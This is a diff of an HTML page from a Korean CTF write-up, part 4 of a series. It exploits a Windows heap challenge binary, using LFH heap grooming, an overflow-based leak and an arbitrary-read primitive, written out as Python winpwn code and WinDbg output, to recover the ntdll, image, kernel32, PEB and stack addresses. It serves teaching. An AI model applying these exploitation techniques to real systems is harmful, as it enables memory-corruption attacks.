+<li>&#xC784;&#xC758;&#xC758; chunk(&#xC5EC;&#xAE30;&#xC11C;&#xB294; LFH5)&#xB97C; &#xD574;&#xC81C;&#xD558;&#xBA74; &#xD604;&#xC7AC; userblock&#xC5D0;&#xB294; &#xBE48; &#xACF5;&#xAC04;&#xC774; LFH5&#xAC00; &#xD574;&#xC81C;&#xB41C; &#xACF5;&#xAC04;&#xBC16;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li>
+<li>add LFH4&#xB85C; <code>LFH4&#x2192;data</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD560;&#xB2F9;&#xD558;&#xBA74; LFH&#xB294; &#xD574;&#xC81C;&#xB41C; chunk &#xC6B0;&#xC120;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xD574;&#xC81C;&#xB41C; LFH5 &#xACF5;&#xAC04;&#xC5D0; &#xC0C8;&#xB85C; data&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.  </li>
+<li>3&#xBC88;&#xC758; &#xACFC;&#xC815;&#xC5D0;&#xC11C; overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xC539;&#xACE0; &#xB72F;&#xACE0; &#xB9DB;&#xBCF4;&#xACE0; &#xC990;&#xAE30;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</li>
 </ol>
-<p>먼저 LFH chunk를 0~16까지 17개를 할당합니다. </p>
+<p>&#xBA3C;&#xC800; LFH chunk&#xB97C; 0~16&#xAE4C;&#xC9C0; 17&#xAC1C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2012.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2012.png"></p>
-<p>랜덤 한 위치에 할당되어 순서는 뒤죽박죽이지만 옹기종기 예쁘게 모여있는 것이 보입니다. chunk17부터는 아래 사진과 같이 새 userblock에 할당되기 때문에 LFH chunk는 기존 userblock을 모두 채울 정도인 0~16까지 17개만 할당합니다. 이는 <code>ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code>를 참고해 해당 userblock에서 사용 가능한 block이 얼마나 되는지 확인해보면 됩니다.</p>
+<p>&#xB79C;&#xB364; &#xD55C; &#xC704;&#xCE58;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xC21C;&#xC11C;&#xB294; &#xB4A4;&#xC8FD;&#xBC15;&#xC8FD;&#xC774;&#xC9C0;&#xB9CC; &#xC639;&#xAE30;&#xC885;&#xAE30; &#xC608;&#xC058;&#xAC8C; &#xBAA8;&#xC5EC;&#xC788;&#xB294; &#xAC83;&#xC774; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. chunk17&#xBD80;&#xD130;&#xB294; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; &#xC0C8; userblock&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; LFH chunk&#xB294; &#xAE30;&#xC874; userblock&#xC744; &#xBAA8;&#xB450; &#xCC44;&#xC6B8; &#xC815;&#xB3C4;&#xC778; 0~16&#xAE4C;&#xC9C0; 17&#xAC1C;&#xB9CC; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code>&#xB97C; &#xCC38;&#xACE0;&#xD574; &#xD574;&#xB2F9; userblock&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; block&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2013.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2013.png"></p>
-<p>이제 LFH5 chunk를 해제하고 add(LFH4)를 통해 해제후 재 할당된 <code>LFH4→data</code> 가 LFH5 chunk에 위치해 있는 것을 볼 수 있습니다. data에 입력한 <code>aaaaaaaa</code> 도 잘 들어가 있네요!</p>
+<p>&#xC774;&#xC81C; LFH5 chunk&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; add(LFH4)&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xC81C;&#xD6C4; &#xC7AC; &#xD560;&#xB2F9;&#xB41C; <code>LFH4&#x2192;data</code> &#xAC00; LFH5 chunk&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. data&#xC5D0; &#xC785;&#xB825;&#xD55C; <code>aaaaaaaa</code> &#xB3C4; &#xC798; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB124;&#xC694;!</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2014.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2014.png"></p>
-<p>이제 <code>0x70</code>만큼 채우면 뒤의 heap address로 heap base address와 바로 뒤 chunk의 key까지 얻을 수 있습니다.</p>
+<p>&#xC774;&#xC81C; <code>0x70</code>&#xB9CC;&#xD07C; &#xCC44;&#xC6B0;&#xBA74; &#xB4A4;&#xC758; heap address&#xB85C; heap base address&#xC640; &#xBC14;&#xB85C; &#xB4A4; chunk&#xC758; key&#xAE4C;&#xC9C0; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *
 
 <span class="hljs-comment">#...</span>
@@ -391,7 +391,7 @@ login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&
 	add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)
 
 delete(<span class="hljs-string">&quot;LFH5&quot;</span>)
-add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)
+add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span>)
 view(<span class="hljs-string">&quot;LFH4&quot;</span>)
 p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)
 heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span> 
@@ -402,7 +402,7 @@ print(<span class="hljs-string">&quot;heap : &quot;</span>,hex(heap_base))
 print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre>
 
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2015.png"></p>
-<p>바로 뒤에 있는 chunk의 key를 구했으니 overflow를 이용하면 leak 한 key의 <code>data</code> 포인터를 수정하면 arbitrary read가 가능하죠! 우리가 필요한 주소들은 다음과 같습니다.</p>
+<p>&#xBC14;&#xB85C; &#xB4A4;&#xC5D0; &#xC788;&#xB294; chunk&#xC758; key&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; overflow&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; leak &#xD55C; key&#xC758; <code>data</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC8E0;! &#xC6B0;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li>ntdll base: ROP gadget</li>
 <li>image base</li>
@@ -410,13 +410,13 @@ print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre>
 <li>PEB : <code>ProcessParameters</code>(stdin, stdout, stderr)</li>
 <li>stack address</li>
 </ul>
-<h2 id="ntdll-base"><a href="#ntdll-base" class="headerlink" title="ntdll base"></a>ntdll base</h2><p><code>_HEAP-&gt;LockVariable-&gt;Lock</code> 은 <code>heap_base + 0x2c0</code> 에 위치해 있습니다. </p>
+<h2 id="ntdll-base"><a href="#ntdll-base" class="headerlink" title="ntdll base"></a>ntdll base</h2><p><code>_HEAP-&gt;LockVariable-&gt;Lock</code> &#xC740; <code>heap_base + 0x2c0</code> &#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2016.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2016.png"></p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2017.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2017.png"></p>
-<p><code>Lock - 0x163d30</code> 로 ntdll의 base address를 구할 수 있습니다. (그리고 윈도우 업데이트 때문에 ntdll 버전이 바뀌어 <code>0x163dd0</code>으로 바뀌었다는 슬픈 사연이… 업데이트 미워)</p>
+<p><code>Lock - 0x163d30</code> &#xB85C; ntdll&#xC758; base address&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xADF8;&#xB9AC;&#xACE0; &#xC708;&#xB3C4;&#xC6B0; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB54C;&#xBB38;&#xC5D0; ntdll &#xBC84;&#xC804;&#xC774; &#xBC14;&#xB00C;&#xC5B4; <code>0x163dd0</code>&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xB2E4;&#xB294; &#xC2AC;&#xD508; &#xC0AC;&#xC5F0;&#xC774;&#x2026; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBBF8;&#xC6CC;)</p>
 <pre><code class="hljs python"><span class="hljs-comment">#...</span>
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>
-	add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))
+	add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span> + p64(addr))
 	view(key)
 	p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)
 	<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))
@@ -428,9 +428,9 @@ ntdll = Lock - <span class="hljs-number">0x163dd0</span> <span class="hljs-comme
 print(hex(ntdll))</code></pre>
 
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2018.png"></p>
-<h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll 주소를 구했으면 바이너리의 imagebase도 금방 구할 수 있습니다. 바로 <code>PebLdr</code> 을 이용해서 구하면 됩니다!</p>
+<h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xBA74; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; imagebase&#xB3C4; &#xAE08;&#xBC29; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; <code>PebLdr</code> &#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xAD6C;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
 <blockquote>
-<p>PebLdr : 로드된 모듈들의 Double Linked List를 담고 있으며 <code>_PEB→Ldr</code>에서 참조한다.</p>
+<p>PebLdr : &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8;&#xB4E4;&#xC758; Double Linked List&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC73C;&#xBA70; <code>_PEB&#x2192;Ldr</code>&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD55C;&#xB2E4;.</p>
 </blockquote>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm 
 start             end                 module name
@@ -451,8 +451,8 @@ start             end                 module name
 <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fd`ea3f53c0 - <span class="hljs-number">00007f</span>fd`ea290000
 Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">001653</span>c0</code></pre>
 
-<p><code>PebLdr</code> 은 <code>ntdll + 0x1653c0</code> 이 되겠네요. 그럼 <code>PebLdr</code>에서 문제 바이너리 dadadb를 찾아보겠습니다.</p>
-<p>모듈이 로드되면 <code>ntdll!_PEB_LDR_DATA→InMemoryOrderModuleList(+0x20)</code> 에 먼저 로드된 순서대로 Double Linked List로 연결됩니다. 그럼 실행중인 바이너리도 당연히 올라와 있겠죠?</p>
+<p><code>PebLdr</code> &#xC740; <code>ntdll + 0x1653c0</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;. &#xADF8;&#xB7FC; <code>PebLdr</code>&#xC5D0;&#xC11C; &#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC; dadadb&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xBAA8;&#xB4C8;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xBA74; <code>ntdll!_PEB_LDR_DATA&#x2192;InMemoryOrderModuleList(+0x20)</code> &#xC5D0; &#xBA3C;&#xC800; &#xB85C;&#xB4DC;&#xB41C; &#xC21C;&#xC11C;&#xB300;&#xB85C; Double Linked List&#xB85C; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC2E4;&#xD589;&#xC911;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB3C4; &#xB2F9;&#xC5F0;&#xD788; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xACA0;&#xC8E0;?</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))
 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))                 [Type: _LIST_ENTRY]
     [+<span class="hljs-number">0x000</span>] Flink            : <span class="hljs-number">0x185b0702660</span> [Type: _LIST_ENTRY *]
@@ -467,7 +467,7 @@ Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hlj
 <span class="hljs-number">00000185</span>`b0702690  <span class="hljs-number">00000000</span>`<span class="hljs-number">00009000</span>
 ...</code></pre>
 
-<p>잘 올라와 있네요! </p>
+<p>&#xC798; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xB124;&#xC694;! </p>
 <pre><code class="hljs python"><span class="hljs-comment">#...</span>
 pebldr = ntdll + <span class="hljs-number">0x1653c0</span>
 IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)
@@ -477,7 +477,7 @@ print(<span class="hljs-string">&quot;imagebase :&quot;</span>,hex(imagebase))
 <span class="hljs-comment">#...</span></code></pre>
 
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2019.png"></p>
-<h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebase를 구했으니 kernel32 base address는 IAT 테이블을 이용해 쉽게 구할 수 있습니다. 자세한 방법은 제가 작년에 출제한 문제인 <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-up에 설명되어 있습니다.</p>
+<h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebase&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; kernel32 base address&#xB294; IAT &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC790;&#xC138;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xC81C;&#xAC00; &#xC791;&#xB144;&#xC5D0; &#xCD9C;&#xC81C;&#xD55C; &#xBB38;&#xC81C;&#xC778; <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-up&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !dh <span class="hljs-number">00007f</span>f6`a72d0000
 ...
 <span class="hljs-number">3000</span> [     <span class="hljs-number">230</span>] address [size] of Import Address Table Directory
@@ -502,13 +502,13 @@ start             end                 module name
 <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 - <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000
 Evaluate expression: <span class="hljs-number">140384</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">00022460</span></code></pre>
 
-<p><code>kernel32!ReadFile</code> 함수는 kernel32 base의 <code>0x22460</code>에 위치해 있습니다.</p>
+<p><code>kernel32!ReadFile</code> &#xD568;&#xC218;&#xB294; kernel32 base&#xC758; <code>0x22460</code>&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span>
 print(<span class="hljs-string">&quot;kernel32 :&quot;</span>,hex(kernel32))</code></pre>
 
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2020.png"></p>
-<p>자 이제 거의 다왔습니다..!</p>
-<h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> 로 PEB와 TEB, Stack주소를 확인할 수 있습니다.</p>
+<p>&#xC790; &#xC774;&#xC81C; &#xAC70;&#xC758; &#xB2E4;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;..!</p>
+<h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> &#xB85C; PEB&#xC640; TEB, Stack&#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !address -summary
 --- Largest Region by Usage ----------- Base Address -------- Region Size ----------
 Free                                    <span class="hljs-number">275</span>`<span class="hljs-number">1e0</span>c0000     <span class="hljs-number">7</span>b7f`<span class="hljs-number">3</span>dea0000 ( <span class="hljs-number">123.497</span> TB)
@@ -521,7 +521,7 @@ Other                                  <span class="hljs-number">7</span>df5`<sp
 TEB                                      e4`<span class="hljs-number">4f</span>9ca000        <span class="hljs-number">0</span>`<span class="hljs-number">00002000</span> (   <span class="hljs-number">8.000</span> kB)
 PEB                                      e4`<span class="hljs-number">4f</span>9c9000        <span class="hljs-number">0</span>`<span class="hljs-number">00001000</span> (   <span class="hljs-number">4.000</span> kB)</code></pre>
 
-<p>PEB는 ntdll의 bss 영역에 위치하며 PEB 주소는 아까 구한 <code>pebldr</code> 주소 근처에 있으니 뒤적뒤적거리며 찾다 보면 나옵니다 ㅎㅎ;</p>
+<p>PEB&#xB294; ntdll&#xC758; bss &#xC601;&#xC5ED;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xBA70; PEB &#xC8FC;&#xC18C;&#xB294; &#xC544;&#xAE4C; &#xAD6C;&#xD55C; <code>pebldr</code> &#xC8FC;&#xC18C; &#xADFC;&#xCC98;&#xC5D0; &#xC788;&#xC73C;&#xB2C8; &#xB4A4;&#xC801;&#xB4A4;&#xC801;&#xAC70;&#xB9AC;&#xBA70; &#xCC3E;&#xB2E4; &#xBCF4;&#xBA74; &#xB098;&#xC635;&#xB2C8;&#xB2E4; &#x314E;&#x314E;;</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm
 start             end                 module name    
 ...    
@@ -537,7 +537,7 @@ start             end                 module name
 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805330  <span class="hljs-number">00000000</span>`<span class="hljs-number">00620026</span>
 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805338  <span class="hljs-number">00000275</span>`<span class="hljs-number">1</span>dfc2470</code></pre>
 
-<p><code>PEB+0x240</code>은 <code>ntdll+0x165328</code>에 있으며 TEB는 <code>PEB + 0x1000</code>에, Stack address는 <code>TEB + 0x10</code>에 있으니 같이 구하겠습니다.</p>
+<p><code>PEB+0x240</code>&#xC740; <code>ntdll+0x165328</code>&#xC5D0; &#xC788;&#xC73C;&#xBA70; TEB&#xB294; <code>PEB + 0x1000</code>&#xC5D0;, Stack address&#xB294; <code>TEB + 0x10</code>&#xC5D0; &#xC788;&#xC73C;&#xB2C8; &#xAC19;&#xC774; &#xAD6C;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>
 teb = peb + <span class="hljs-number">0x1000</span>
 stack = readmem(key, teb+<span class="hljs-number">0x10</span>)
@@ -546,13 +546,13 @@ print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre>
 
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2021.png"></p>
 <hr>
-<p>드디어ㅓㅓㅓ 익스에 필요한 모든 정보를 구했습니다! </p>
-<p>다음 파트에서는 본격적으로 exploit을 해보도록 하겠으며 전 그럼 이미 망한 중간고사 공부하러 20000..</p>
-<h1 id="Part-5-예고"><a href="#Part-5-예고" class="headerlink" title="Part 5 예고"></a>Part 5 예고</h1><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2022.png"></p>
+<p>&#xB4DC;&#xB514;&#xC5B4;&#x3153;&#x3153;&#x3153; &#xC775;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
+<p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; exploit&#xC744; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC73C;&#xBA70; &#xC804; &#xADF8;&#xB7FC; &#xC774;&#xBBF8; &#xB9DD;&#xD55C; &#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xACF5;&#xBD80;&#xD558;&#xB7EC; 20000..</p>
+<h1 id="Part-5-&#xC608;&#xACE0;"><a href="#Part-5-&#xC608;&#xACE0;" class="headerlink" title="Part 5 &#xC608;&#xACE0;"></a>Part 5 &#xC608;&#xACE0;</h1><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2022.png"></p>
 <blockquote>
-<p>??? : 나만익스안돼나만익스안돼나만익스안돼   -2020 겨울, 크리스마스 CTF 문제 제작 중-</p>
+<p>??? : &#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;   -2020 &#xACA8;&#xC6B8;, &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF &#xBB38;&#xC81C; &#xC81C;&#xC791; &#xC911;-</p>
 </blockquote>
-<p>과연 다음 글에서는 작년과 같은 참사 없이 익스에 성공해 Flag를 영접할 수 있을지…</p>
+<p>&#xACFC;&#xC5F0; &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC791;&#xB144;&#xACFC; &#xAC19;&#xC740; &#xCC38;&#xC0AC; &#xC5C6;&#xC774; &#xC775;&#xC2A4;&#xC5D0; &#xC131;&#xACF5;&#xD574; Flag&#xB97C; &#xC601;&#xC811;&#xD560; &#xC218; &#xC788;&#xC744;&#xC9C0;&#x2026;</p>
 
             </div>
             <hr>
@@ -861,6 +861,45 @@ print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
